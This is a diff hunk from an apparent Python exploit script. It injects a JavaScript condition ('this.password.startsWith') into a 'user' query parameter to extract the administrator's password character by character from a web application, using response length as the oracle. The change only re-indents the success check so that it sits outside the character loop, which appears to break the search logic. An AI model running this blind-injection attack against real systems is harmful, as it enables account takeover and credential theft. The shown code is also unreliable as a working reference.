@@ -84,10 +84,10 @@ async def main():
             if char in special_chars: char = '\\' + char
             payload = f"administrator'%26%26this.username=='administrator'%26%26this.password.startsWith('{found_char + char}')%26%26'1'=='1"
             result = requests.get(url + path + "?user="+ payload,headers=headers).text
-            if len(result) ==  96:
-               found_char += char
-               print(f"[+] Found_char::{found_char}")
-               break
+         if len(result) ==  96:
+            found_char += char
+            print(f"[+] Found_char::{found_char}")
+            break
 
 if __name__ == "__main__":
     asyncio.run(main())
